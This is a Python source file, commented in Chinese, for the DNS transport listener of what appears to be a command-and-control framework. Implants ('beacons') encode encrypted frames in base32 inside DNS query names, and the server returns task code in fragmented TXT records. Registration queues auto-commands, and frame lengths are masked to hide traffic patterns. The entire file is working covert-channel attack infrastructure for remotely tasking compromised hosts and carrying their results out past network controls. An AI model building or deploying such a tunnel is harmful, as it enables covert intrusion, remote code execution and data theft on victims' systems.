"""server/infra/dns_listener.py — DNS 传输监听器（f8 基础版）。

beacon 把帧数据 base32 编码进 A 查询域名（无状态，fire-and-forget）：
  <b32(帧数据)|poll>.<bid>.<mode>.<tunnel-domain>
server 把响应帧 base32 分片为多条 TXT 记录回给 beacon。
请求方向限小块（域名 253 字符上限），响应方向 TXT 多片不受限。

与 HTTPS transport 同一套无状态协议逻辑（register / result / 轮询）。
"""

import base64
import json
import socket
import struct
import threading
import time

from server.core.crypto import encode_frame, decode_frame
from server.core.protocol import (REGISTER, RESULT, WELCOME, PONG, TASKS,
                                  frame_mask, validate_message)
from server.sessions.engine import (
    register_beacon, store_result, build_auto_tasks, take_task_batch, InFlight,
)

_CACHE_TTL = 60.0     # 分片缓存存活上限（M2）
_CACHE_MAX = 512      # 分片缓存条目上限（M2：防内存耗尽）
_RESP_SPLIT_LIMIT = 40  # 单 UDP 报文最多回传的 TXT 分片数（超出改逐片拉取）
_MAX_FRAGMENTS = 12000  # 请求方向单帧最大分片数（防越界序号/超大 total 撑爆内存）


def _b32e(data: bytes) -> str:
    return base64.b32encode(data).decode("ascii").rstrip("=")


def _b32d(s: str) -> bytes:
    pad = "=" * (-len(s) % 8)
    return base64.b32decode(s + pad)


def parse_query(packet: bytes):
    """解析 DNS 查询，返回 (qid, labels, qtype) 或 None。"""
    if len(packet) < 12:
        return None
    qid = packet[:2]
    flags = struct.unpack(">H", packet[2:4])[0]
    if (flags >> 15) != 0:
        return None  # 非查询
    qd = struct.unpack(">H", packet[4:6])[0]
    if qd == 0:
        return None
    off = 12
    labels = []
    while off < len(packet):
        ln = packet[off]
        if ln == 0:
            off += 1
            break
        if ln & 0xC0:
            return None  # 查询不应有压缩指针
        off += 1
        labels.append(packet[off:off + ln].decode("ascii", "replace"))
        off += ln
    if off + 4 > len(packet):
        return None
    qtype, _qclass = struct.unpack(">HH", packet[off:off + 4])
    return qid, labels, qtype


def build_txt_response(qid: bytes, labels: list, qtype: int,
                       txt_chunks: list) -> bytes:
    """构造 DNS 响应：question 原样 + 多条 TXT RR（分片）。"""
    qname = b"".join(bytes([len(p)]) + p.encode("ascii") for p in labels) + b"\x00"
    flags = 0x8180
    header = qid + struct.pack(">HHHHH", flags, 1, len(txt_chunks), 0, 0)
    answer = b""
    for chunk in txt_chunks:
        rdata = bytes([len(chunk)]) + chunk  # TXT rdata: length-prefixed
        answer += (b"\xc0\x0c" + struct.pack(">HHI", 16, 1, 60)
                   + struct.pack(">H", len(rdata)) + rdata)
    return header + qname + struct.pack(">HH", qtype, 1) + answer


class _DnsServer:
    """UDP DNS 服务：解析查询 → 无状态协议处理 → TXT 响应。"""

    def __init__(self, host, port, key, mgr, tq, events,
                 config=None, smods=None, dispatcher=None):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((host, port))
        self._sock.settimeout(1.0)
        self._key = key
        self._mgr = mgr
        self._tq = tq
        self._events = events
        self._config = config
        self._smods = smods
        self._dispatcher = dispatcher
        self._inflight = InFlight()
        self._cache = {}            # 分片请求缓存: bid -> {seq: seg}
        self._resp_cache = {}       # 分片响应缓存: bid -> (ts, [chunk, ...])
        self._running = False
        self._thread = threading.Thread(target=self._loop, daemon=True)

    def _frame(self, msg: dict) -> bytes:
        payload = encode_frame(json.dumps(msg).encode("utf-8"), self._key)
        # 长度头掩码(与 protocol.send_frame 一致,混淆长度分布)
        return struct.pack(">I", len(payload) ^ frame_mask(self._key)) + payload

    def _handle(self, packet: bytes) -> bytes:
        parsed = parse_query(packet)
        if not parsed:
            return b""
        qid, labels, qtype = parsed
        if len(labels) < 3:
            return build_txt_response(qid, labels, qtype, [b""])

        # 轮询：poll.<bid>.<domain...>（v2 批量: 每次响应一批任务,取完继续轮询）
        if labels[0] == "poll":
            bid = labels[1]
            if bid and bid != "poll":
                resp = self._batch_response(bid, [])
            else:
                resp = self._frame({"type": PONG})
            return self._txt_response(qid, labels, qtype, resp, bid)

        # 响应分片拉取: r<idx>.<bid>.<domain...>（大响应改逐片拉取）
        if labels[0].startswith("r") and labels[0][1:].isdigit():
            # 惰性清理过期响应缓存（防大响应条目累积耗尽内存）
            if len(self._resp_cache) > _CACHE_MAX:
                now = time.time()
                stale = [b for b, c in self._resp_cache.items()
                         if now - c[0] > _CACHE_TTL]
                for b in stale:
                    self._resp_cache.pop(b, None)
            idx = int(labels[0][1:])
            bid = labels[1]
            item = self._resp_cache.get(bid)
            chunk = b""
            if (item and time.time() - item[0] < _CACHE_TTL
                    and 0 <= idx < len(item[1])):
                chunk = item[1][idx].encode("ascii")
            return build_txt_response(qid, labels, qtype, [chunk])

        # 数据分片: <seg>.<seq>.<total>.<bid>.<domain...>
        try:
            seg, seq_s, total_s, bid = labels[0], labels[1], labels[2], labels[3]
            seq, total = int(seq_s), int(total_s)
        except (ValueError, IndexError):
            return build_txt_response(qid, labels, qtype, [b""])
        # total 上限防内存耗尽；seq 越界（含负数）直接丢弃——否则一个
        # 越界序号会撑高 dict 计数，令收齐判定误通过 → KeyError + cache 泄漏
        if total <= 0 or total > _MAX_FRAGMENTS or not (0 <= seq < total):
            return build_txt_response(qid, labels, qtype, [b""])
        now = time.time()
        # M2：惰性清理过期缓存 + 条目上限（防攻击者用不完整分片耗尽内存）
        if len(self._cache) > _CACHE_MAX:
            stale = [b for b, c in self._cache.items()
                     if now - c[0] > _CACHE_TTL]
            for b in stale:
                self._cache.pop(b, None)
        cache = self._cache.setdefault(bid, (now, {}))
        if now - cache[0] > _CACHE_TTL:
            cache = self._cache[bid] = (now, {})   # 过期重置
        cache[1][seq] = seg
        if len(cache[1]) < total:
            # 确认收到，无数据（beacon 端继续发剩余分片）
            return build_txt_response(qid, labels, qtype, [b""])
        full = "".join(cache[1][i] for i in range(total))
        self._cache.pop(bid, None)
        try:
            raw = _b32d(full)
            msg = json.loads(decode_frame(raw[4:], self._key)
                             .decode("utf-8"))
        except Exception:
            return build_txt_response(qid, labels, qtype, [b""])
        # M3：与 TCP 通道一致的整帧校验（此前 DNS 无校验）
        if validate_message(msg):
            return build_txt_response(qid, labels, qtype, [b""])

        if msg.get("type") == REGISTER:
            bid2, is_new = register_beacon(msg, self._mgr, self._events)
            if is_new:
                for task in build_auto_tasks(self._config.auto_commands,
                                             bid2, self._dispatcher):
                    self._tq.push(bid2, task)
            resp = self._frame({"type": WELCOME, "version": 2})
        elif msg.get("type") == RESULT:
            rp, pa = self._inflight.take(msg.get("task_id", ""))
            store_result(bid, msg.get("task_id", ""),
                         msg.get("output", ""), msg.get("error", ""),
                         self._mgr, self._events,
                         self._config.max_result_size,
                         smods=self._smods, dispatcher=self._dispatcher,
                         result_processor=rp, proc_arg=pa)
            # v2 批量: 逐条确认(acked=[该 task_id]) + 顺带领取一批新任务
            resp = self._batch_response(bid, [msg.get("task_id", "")])
        elif msg.get("type") == FETCH:
            resp = self._batch_response(bid, [])
        else:
            resp = self._frame({"type": PONG})
        return self._txt_response(qid, labels, qtype, resp, bid)

    def _batch_response(self, bid: str, acked: list) -> bytes:
        """按预算领取一批任务 → TASKS 帧(acked 确认 + tasks 批量)。

        无任务时: 有 acked 回空 TASKS 帧(确认必须送达), 否则 PONG。
        """
        budget = max(4096, int(getattr(self._config, "max_frame_size", 512 * 1024) * 0.8))
        tasks = take_task_batch(bid, self._tq, budget)
        if not tasks:
            if acked:
                return self._frame(
                    {"type": TASKS, "tasks": [], "acked": list(acked)})
            return self._frame({"type": PONG})
        for t in tasks:
            self._inflight.track(t)  # 登记 result_processor(无状态通道续传用)
        return self._frame(
            {"type": TASKS,
             "tasks": [{"task_id": t.task_id, "code": t.code} for t in tasks],
             "acked": list(acked)})

    def _txt_response(self, qid, labels, qtype, resp_frame: bytes,
                      bid: str = "") -> bytes:
        """响应帧 → base32 分片 → 多条 TXT RR。

        单个 UDP 报文（beacon 端 recv(4096)）装不下时：缓存分片并返回
        s<total> 标记，beacon 用 r<idx> 查询逐片拉取，避免响应被静默截断。
        """
        b32 = _b32e(resp_frame)
        chunks = [b32[i:i + 60] for i in range(0, len(b32), 60)]
        if bid and len(chunks) > _RESP_SPLIT_LIMIT:
            self._resp_cache[bid] = (time.time(), chunks)
            return build_txt_response(
                qid, labels, qtype, [f"s{len(chunks)}".encode("ascii")])
        return build_txt_response(
            qid, labels, qtype,
            [c.encode("ascii") for c in chunks] or [b""])

    def _loop(self):
        while self._running:
            try:
                packet, addr = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                resp = self._handle(packet)
            except Exception:
                resp = b""
            if resp:
                try:
                    self._sock.sendto(resp, addr)
                except OSError:
                    pass

    def start(self):
        self._running = True
        self._thread.start()

    def stop(self):
        self._running = False
        try:
            self._sock.close()
        except OSError:
            pass
        self._thread.join(timeout=3)
